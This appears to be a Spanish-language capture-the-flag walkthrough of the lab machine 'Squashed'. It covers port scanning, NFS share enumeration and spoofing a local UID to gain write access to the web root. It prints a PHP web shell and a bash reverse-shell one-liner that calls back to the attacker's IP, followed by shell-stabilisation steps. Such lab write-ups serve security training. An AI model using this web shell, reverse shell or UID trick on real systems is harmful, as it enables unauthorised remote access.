# Maquina Squashed

Se ejecuto mapeo con rustscan de la mano con nmap para servicios y deteccion de vulnerabilidades con el script de "vulners":

```
Open 10.10.11.191:22
Open 10.10.11.191:80
Open 10.10.11.191:111
Open 10.10.11.191:2049
Open 10.10.11.191:8000
Open 10.10.11.191:43215
Open 10.10.11.191:48357
Open 10.10.11.191:49029
Open 10.10.11.191:53201
```

# Servicios por puerto:

```

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	CVE-2020-12062	5.0	https://vulners.com/cve/CVE-2020-12062
|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|     	CVE-2022-31813	7.5	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2020-11984	7.5	https://vulners.com/cve/CVE-2020-11984
|     	CNVD-2022-73123	7.5	https://vulners.com/cnvd/CNVD-2022-73123
|     	CNVD-2022-03225	7.5	https://vulners.com/cnvd/CNVD-2022-03225
|     	CNVD-2021-102386	7.5	https://vulners.com/cnvd/CNVD-2021-102386
|     	1337DAY-ID-34882	7.5	https://vulners.com/zdt/1337DAY-ID-34882	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CNVD-2022-03224	6.8	https://vulners.com/cnvd/CNVD-2022-03224
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	6.8	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	4373C92A-2755-5538-9C91-0469C995AA9B	6.8	https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B	*EXPLOIT*
|     	0095E929-7573-5E4A-A7FA-F6598A35E8DE	6.8	https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE	*EXPLOIT*
|     	CVE-2022-28615	6.4	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2022-22721	5.8	https://vulners.com/cve/CVE-2022-22721
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2022-30556	5.0	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	5.0	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-28614	5.0	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-26377	5.0	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	5.0	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2021-36160	5.0	https://vulners.com/cve/CVE-2021-36160
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-30641	5.0	https://vulners.com/cve/CVE-2021-30641
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2020-13950	5.0	https://vulners.com/cve/CVE-2020-13950
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CNVD-2022-73122	5.0	https://vulners.com/cnvd/CNVD-2022-73122
|     	CNVD-2022-53584	5.0	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-53582	5.0	https://vulners.com/cnvd/CNVD-2022-53582
|     	CNVD-2022-03223	5.0	https://vulners.com/cnvd/CNVD-2022-03223
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|     	1337DAY-ID-35422	4.3	https://vulners.com/zdt/1337DAY-ID-35422	*EXPLOIT*
|     	CVE-2023-27522	0.0	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2023-25690	0.0	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-37436	0.0	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-36760	0.0	https://vulners.com/cve/CVE-2022-36760
|_    	CVE-2006-20001	0.0	https://vulners.com/cve/CVE-2006-20001
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43331/udp6  mountd
|   100005  1,2,3      45537/udp   mountd
|   100005  1,2,3      48357/tcp   mountd
|   100005  1,2,3      54725/tcp6  mountd
|   100021  1,3,4      39705/tcp6  nlockmgr
|   100021  1,3,4      43215/tcp   nlockmgr
|   100021  1,3,4      44185/udp   nlockmgr
|   100021  1,3,4      57177/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
8000/tcp  open  http     syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
| vulners: 
|   cpe:/a:python:simplehttpserver:0.6: 
|     	NODEJS:744	5.0	https://vulners.com/nodejs/NODEJS:744
|_    	NODEJS:585	3.5	https://vulners.com/nodejs/NODEJS:585
43215/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
48357/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
49029/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
53201/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
```
# Puerto 2049

En este puerto indica que hay un `nfs` (network file shareing), primera vez ante este servicio para enumerarlo o listarlo se hace con el comando `showmount -e 10.10.11.191`, :

```

Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

## Esto nos da mas visibilidad en lo que claramente es un sitio con puerto 80 abierto y ya indica esos dos paths para seguir enumerando.

# Montando el nfs

Podemos montar el `nfs` localmente en nuestra maquina asi no metemos mano directamente del navegador, generamos los directorios correspondientes y montamos con el comando `mount -t`:

```

mkdir -p /mnt/ross/
mkdir -p /mnt/web_server/

sudo mount -t nfs 10.10.11.191:/home/ross /mnt/ross/
sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/web_server/
```

## Podemos accesar al share `/mnt/ross` pero al `web_server` no teenos permiso, solo el usuario `2017` tiene permiso, como no tenemos o somos ese usuario solo hay que crearlo localmente, asignarle unicamnete el grupo de `www-data` y podria funcionar.

```

sudo useradd testeo
sudo usermod -u 2017 testeo
sudo groupmod -g 2017 testeo
su testeo
```

## Ya com el neuvo usuario podemos enumerar y listar.

# contenidos:

```
drwxr-xr-- 5 testeo http 4.0K Apr  2 04:35 .
drwxr-xr-x 1 root   root   28 Apr  2 04:25 ..
drwxr-xr-x 2 testeo http 4.0K Apr  2 04:35 css
-rw-r--r-- 1 testeo http   44 Oct 21 05:30 .htaccess
drwxr-xr-x 2 testeo http 4.0K Apr  2 04:35 images
-rw-r----- 1 testeo http  32K Apr  2 04:35 index.html
drwxr-xr-x 2 testeo http 4.0K Apr  2 04:35 js
bash: /home/testeo/.bashrc: No such file or directory
```

## Probando la posibilidad de leer y escribir todo sale con exito, creare un archivo `php` que funja como un comando intermediario para todo lo que queira correr en el servidor:

```
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
## guardamos y desde el navegador vamos a copiar este comando para iniciar un reverseshell mediante `sudo nc -nlvp 443` desde nuestra maquina y despues damos enter al navegador con el comando:

```
10.10.11.191/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.51/443 0>%261"
```
## ya teneidno reverseshell vamos a purifciar la bash shell 

1) script /dev/null -c bash
2) presionar CTRL + z
3) stty raw -echo; fg
4) reset xterm
5) export TERM=xterm

## Ya todo deberia de funcionar bien y la shell no se caera aun que hiciera CTRL+C . 
